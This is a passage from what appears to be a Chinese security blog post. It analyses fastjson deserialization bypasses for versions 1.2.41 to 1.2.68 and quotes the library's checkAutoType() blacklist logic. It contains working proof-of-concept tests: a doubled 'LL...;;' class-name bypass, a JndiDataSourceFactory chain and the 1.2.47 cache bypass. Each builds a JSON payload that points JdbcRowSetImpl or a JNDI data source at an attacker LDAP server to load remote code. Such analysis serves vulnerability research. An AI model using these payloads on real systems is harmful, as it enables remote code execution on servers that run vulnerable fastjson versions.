+                    <span class="token keyword">if</span> <span class="token punctuation">(</span>Arrays<span class="token punctuation">.</span><span class="token function">binarySearch</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>denyHashCodes<span class="token punctuation">,</span> hash<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> TypeUtils<span class="token punctuation">.</span><span class="token function">getClassFromMapping</span><span class="token punctuation">(</span>typeName<span class="token punctuation">)</span> <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"autoType is not support. "</span> <span class="token operator">+</span> typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    <span class="token punctuation">}</span>
+                <span class="token punctuation">}</span>
+            <span class="token punctuation">}</span>
+
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>clazz <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                clazz <span class="token operator">=</span> TypeUtils<span class="token punctuation">.</span><span class="token function">getClassFromMapping</span><span class="token punctuation">(</span>typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>clazz <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                clazz <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>deserializers<span class="token punctuation">.</span><span class="token function">findClass</span><span class="token punctuation">(</span>typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>clazz <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span>expectClass <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> clazz <span class="token operator">!=</span> HashMap<span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>expectClass<span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"type not match. "</span> <span class="token operator">+</span> typeName <span class="token operator">+</span> <span class="token string">" -> "</span> <span class="token operator">+</span> expectClass<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+                    <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>autoTypeSupport<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    hash <span class="token operator">=</span> h3<span class="token punctuation">;</span>
+
+                    <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> className<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                        <span class="token keyword">char</span> c <span class="token operator">=</span> className<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                        hash <span class="token operator">^=</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>c<span class="token punctuation">;</span>
+                        hash <span class="token operator">*=</span> 1099511628211L<span class="token punctuation">;</span>
+                        <span class="token keyword">if</span> <span class="token punctuation">(</span>Arrays<span class="token punctuation">.</span><span class="token function">binarySearch</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>denyHashCodes<span class="token punctuation">,</span> hash<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"autoType is not support. "</span> <span class="token operator">+</span> typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                        <span class="token punctuation">}</span>
+
+                        <span class="token keyword">if</span> <span class="token punctuation">(</span>Arrays<span class="token punctuation">.</span><span class="token function">binarySearch</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>acceptHashCodes<span class="token punctuation">,</span> hash<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                            <span class="token keyword">if</span> <span class="token punctuation">(</span>clazz <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                                clazz <span class="token operator">=</span> TypeUtils<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>typeName<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>defaultClassLoader<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                            <span class="token punctuation">}</span>
+
+                            <span class="token keyword">if</span> <span class="token punctuation">(</span>expectClass <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> expectClass<span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"type not match. "</span> <span class="token operator">+</span> typeName <span class="token operator">+</span> <span class="token string">" -> "</span> <span class="token operator">+</span> expectClass<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                            <span class="token punctuation">}</span>
+
+                            <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>
+                        <span class="token punctuation">}</span>
+                    <span class="token punctuation">}</span>
+                <span class="token punctuation">}</span>
+
+                <span class="token keyword">if</span> <span class="token punctuation">(</span>clazz <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    clazz <span class="token operator">=</span> TypeUtils<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>typeName<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>defaultClassLoader<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+
+                <span class="token keyword">if</span> <span class="token punctuation">(</span>clazz <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    <span class="token keyword">if</span> <span class="token punctuation">(</span>TypeUtils<span class="token punctuation">.</span><span class="token function">getAnnotation</span><span class="token punctuation">(</span>clazz<span class="token punctuation">,</span> JSONType<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                        <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>
+                    <span class="token punctuation">}</span>
+
+                    <span class="token keyword">if</span> <span class="token punctuation">(</span>ClassLoader<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span> <span class="token operator">||</span> DataSource<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"autoType is not support. "</span> <span class="token operator">+</span> typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    <span class="token punctuation">}</span>
+
+                    <span class="token keyword">if</span> <span class="token punctuation">(</span>expectClass <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                        <span class="token keyword">if</span> <span class="token punctuation">(</span>expectClass<span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                            <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>
+                        <span class="token punctuation">}</span>
+
+                        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"type not match. "</span> <span class="token operator">+</span> typeName <span class="token operator">+</span> <span class="token string">" -> "</span> <span class="token operator">+</span> expectClass<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    <span class="token punctuation">}</span>
+
+                    JavaBeanInfo beanInfo <span class="token operator">=</span> JavaBeanInfo<span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span>clazz<span class="token punctuation">,</span> clazz<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>propertyNamingStrategy<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    <span class="token keyword">if</span> <span class="token punctuation">(</span>beanInfo<span class="token punctuation">.</span>creatorConstructor <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>autoTypeSupport<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"autoType is not support. "</span> <span class="token operator">+</span> typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    <span class="token punctuation">}</span>
+                <span class="token punctuation">}</span>
+
+                <span class="token keyword">int</span> mask <span class="token operator">=</span> Feature<span class="token punctuation">.</span>SupportAutoType<span class="token punctuation">.</span>mask<span class="token punctuation">;</span>
+                <span class="token keyword">boolean</span> autoTypeSupport <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>autoTypeSupport <span class="token operator">||</span> <span class="token punctuation">(</span>features <span class="token operator">&amp;</span> mask<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token punctuation">(</span>JSON<span class="token punctuation">.</span>DEFAULT_PARSER_FEATURE <span class="token operator">&amp;</span> mask<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>autoTypeSupport<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"autoType is not support. "</span> <span class="token operator">+</span> typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+                    <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"autoType is not support. "</span> <span class="token operator">+</span> typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>可以看新的checkAutoType() 逻辑：</p>
+<blockquote>
+<p>1.黑名机制由字符匹配该到hash的逻辑比较，denyHashCodes内置写入,长度有限；所以绕过这个就是寻找新的利用链不在黑名内。</p>
+<pre class="line-numbers language-java"><code class="language-java">        <span class="token keyword">this</span><span class="token punctuation">.</span>denyHashCodes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">long</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token operator">-</span>8720046426850100497L<span class="token punctuation">,</span> <span class="token operator">-</span>8109300701639721088L<span class="token punctuation">,</span> <span class="token operator">-</span>7966123100503199569L<span class="token punctuation">,</span> <span class="token operator">-</span>7766605818834748097L<span class="token punctuation">,</span> <span class="token operator">-</span>6835437086156813536L<span class="token punctuation">,</span> <span class="token operator">-</span>4837536971810737970L<span class="token punctuation">,</span> <span class="token operator">-</span>4082057040235125754L<span class="token punctuation">,</span> <span class="token operator">-</span>2364987994247679115L<span class="token punctuation">,</span> <span class="token operator">-</span>1872417015366588117L<span class="token punctuation">,</span> <span class="token operator">-</span>254670111376247151L<span class="token punctuation">,</span> <span class="token operator">-</span>190281065685395680L<span class="token punctuation">,</span> 33238344207745342L<span class="token punctuation">,</span> 313864100207897507L<span class="token punctuation">,</span> 1203232727967308606L<span class="token punctuation">,</span> 1502845958873959152L<span class="token punctuation">,</span> 3547627781654598988L<span class="token punctuation">,</span> 3730752432285826863L<span class="token punctuation">,</span> 3794316665763266033L<span class="token punctuation">,</span> 4147696707147271408L<span class="token punctuation">,</span> 5347909877633654828L<span class="token punctuation">,</span> 5450448828334921485L<span class="token punctuation">,</span> 5751393439502795295L<span class="token punctuation">,</span> 5944107969236155580L<span class="token punctuation">,</span> 6742705432718011780L<span class="token punctuation">,</span> 7179336928365889465L<span class="token punctuation">,</span> 7442624256860549330L<span class="token punctuation">,</span> 8838294710098435315L<span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</blockquote>
+<blockquote>
+<p>2.从checkAutoType()对L 与;做了处理，但只是删除了一次，类似与XSS等防御的双写绕过</p>
+<pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">-</span>3750763034362895579L <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>className<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> 1099511628211L <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>className<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>className<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> 1099511628211L <span class="token operator">==</span> 655701488918567152L<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    className <span class="token operator">=</span> className<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> className<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+</blockquote>
+<p>所以绕过这个的版本的payload是双写</p>
+<pre class="line-numbers language-java"><code class="language-java"><span class="token annotation punctuation">@Test</span>
+<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">TestJdbcRowsetImple</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token comment" spellcheck="true">//final String clazz = "com.sun.rowset.JdbcRowSetImpl"; //fastjson 1.2.24</span>
+    <span class="token comment" spellcheck="true">//final String clazz = "Lcom.sun.rowset.JdbcRowSetImpl;"; //fastjson 1.2.41</span>
+    <span class="token keyword">final</span> String clazz <span class="token operator">=</span> <span class="token string">"LLcom.sun.rowset.JdbcRowSetImpl;;"</span><span class="token punctuation">;</span> 
+    <span class="token keyword">final</span> String addr <span class="token operator">=</span> <span class="token string">"ldap://192.168.8.115:1099/evil"</span><span class="token punctuation">;</span>
+
+
+    String poc <span class="token operator">=</span> <span class="token string">"{\"@type\":\""</span> <span class="token operator">+</span>clazz <span class="token operator">+</span><span class="token string">"\","</span><span class="token operator">+</span>
+        <span class="token string">"\"dataSourceName\":\""</span> <span class="token operator">+</span> addr <span class="token operator">+</span> <span class="token string">"\","</span> <span class="token operator">+</span>
+        <span class="token string">"\"autoCommit\":true"</span> <span class="token operator">+</span>
+        <span class="token string">"}"</span><span class="token punctuation">;</span>
+    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>poc<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    ParserConfig<span class="token punctuation">.</span><span class="token function">getGlobalInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setAutoTypeSupport</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    JSONObject<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>poc<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/image-20201228193113524.png" alt="image-20201228193113524"></p>
+<h3 id="2-3-fastjson-1-2-43"><a href="#2-3-fastjson-1-2-43" class="headerlink" title="2.3 fastjson 1.2.43"></a>2.3 fastjson 1.2.43</h3><p>这个版本对上面的绕过修改了字符的处理 逻辑</p>
+<pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">//hash计算基础参数</span>
+<span class="token keyword">long</span> BASIC <span class="token operator">=</span> <span class="token operator">-</span>3750763034362895579L<span class="token punctuation">;</span>
+<span class="token keyword">long</span> PRIME <span class="token operator">=</span> 1099511628211L<span class="token punctuation">;</span>
+<span class="token comment" spellcheck="true">//L开头，；结尾</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">-</span>3750763034362895579L <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>className<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> 1099511628211L <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>className<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>className<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> 1099511628211L <span class="token operator">==</span> 655701488918567152L<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token comment" spellcheck="true">//LL开头</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">-</span>3750763034362895579L <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>className<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> 1099511628211L <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>className<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> 1099511628211L <span class="token operator">==</span> 655656408941810501L<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token comment" spellcheck="true">//直接爆出异常</span>
+        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"autoType is not support. "</span> <span class="token operator">+</span> typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    className <span class="token operator">=</span> className<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> className<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>对于双写的情况直接报错</p>
+<p>从这里就是不断寻找新的利用链了，如 ibatis-core 3:0依赖的</p>
+<p><code>org.apache.ibatis.datasource.jndi.JndiDataSourceFactory</code></p>
+<p>POC</p>
+<pre class="line-numbers language-java"><code class="language-java"><span class="token annotation punctuation">@Test</span>
+<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">TestJndiDataSourceFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token keyword">final</span> String clazz <span class="token operator">=</span> <span class="token string">"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory"</span><span class="token punctuation">;</span>
+    <span class="token keyword">final</span> String addr <span class="token operator">=</span> <span class="token string">"ldap://192.168.8.115:1099/evil"</span><span class="token punctuation">;</span>
+
+    String poc <span class="token operator">=</span> <span class="token string">"{\"@type\":\""</span><span class="token operator">+</span>clazz<span class="token operator">+</span><span class="token string">"\",\"properties\":{\"data_source\":\""</span><span class="token operator">+</span>addr <span class="token operator">+</span><span class="token string">"\"}}"</span><span class="token punctuation">;</span>
+    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>poc<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    ParserConfig<span class="token punctuation">.</span><span class="token function">getGlobalInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setAutoTypeSupport</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    JSONObject<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>poc<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/image-20201228192946432.png" alt="image-20201228192946432"></p>
+<h3 id="2-4-fastjson-1-2-47"><a href="#2-4-fastjson-1-2-47" class="headerlink" title="2.4 fastjson 1.2.47"></a>2.4 fastjson 1.2.47</h3><p>这是一个通杀的版本，可以不用手动开启autoType,不论autoType设置如何都可以触发</p>
+<p>json串满足</p>
+<pre class="line-numbers language-json"><code class="language-json"><span class="token punctuation">{</span>
+    <span class="token property">"a"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
+        <span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"java.lang.Class"</span><span class="token punctuation">,</span> 
+        <span class="token property">"val"</span><span class="token operator">:</span> <span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span>
+    <span class="token punctuation">}</span><span class="token punctuation">,</span> 
+    <span class="token property">"b"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
+        <span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span><span class="token punctuation">,</span> 
+        <span class="token property">"dataSourceName"</span><span class="token operator">:</span> <span class="token string">"ldap://localhost:1389/Exploit"</span><span class="token punctuation">,</span> 
+        <span class="token property">"autoCommit"</span><span class="token operator">:</span> <span class="token boolean">true</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>poc</p>
+<pre class="line-numbers language-java"><code class="language-java">    <span class="token annotation punctuation">@Test</span>
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">TestGenericCacheBypass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">final</span> String payload <span class="token operator">=</span> <span class="token string">"{\n"</span> <span class="token operator">+</span>
+                <span class="token string">"    \"a\": {\n"</span> <span class="token operator">+</span>
+                <span class="token string">"        \"@type\": \"java.lang.Class\", \n"</span> <span class="token operator">+</span>
+                <span class="token string">"        \"val\": \"%s\"\n"</span> <span class="token operator">+</span>
+                <span class="token string">"    }, \n"</span> <span class="token operator">+</span>
+                <span class="token string">"    \"b\": {\n"</span> <span class="token operator">+</span>
+                <span class="token string">"        \"@type\": \"%s\", \n"</span> <span class="token operator">+</span>
+                <span class="token string">"        \"dataSourceName\": \"%s\", \n"</span> <span class="token operator">+</span>
+                <span class="token string">"        \"autoCommit\": true\n"</span> <span class="token operator">+</span>
+                <span class="token string">"    }\n"</span> <span class="token operator">+</span>
+                <span class="token string">"}"</span><span class="token punctuation">;</span>
+        String clazz <span class="token operator">=</span> <span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span><span class="token punctuation">;</span>
+        String add <span class="token operator">=</span> <span class="token string">"ldap://192.168.8.115:1099/evil"</span><span class="token punctuation">;</span>
+
+        String poc <span class="token operator">=</span> String<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> clazz<span class="token punctuation">,</span> clazz<span class="token punctuation">,</span> add<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>poc<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        JSONObject<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>poc<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>运行效果</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/image-20201228195007824.png" alt="image-20201228195007824"></p>
+<h2 id="三、Fastjson-lt-1-2-68"><a href="#三、Fastjson-lt-1-2-68" class="headerlink" title="三、Fastjson <= 1.2.68"></a>三、Fastjson &lt;= 1.2.68</h2><p>在fastjson1.2.48后对cache缓存进行修复，fastjson 1.2.47通杀的利用自此失效。</p>
+<p>这个的利用前提是服务端存在可以利用类</p>
+<p>如</p>
+<pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>thonsun<span class="token punctuation">.</span>demo02<span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span>
+
+<span class="token comment" spellcheck="true">/**
+ * @Project: test-poc
+ * @Desc: fastjson &lt;= 1.2.68利用类
+ * @Author: thonsun
+ * @Create: 2020/12/28 20:11
+ **/</span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">VulClass</span> <span class="token keyword">implements</span> <span class="token class-name">AutoCloseable</span> <span class="token punctuation">{</span>
+    <span class="token annotation punctuation">@Override</span>
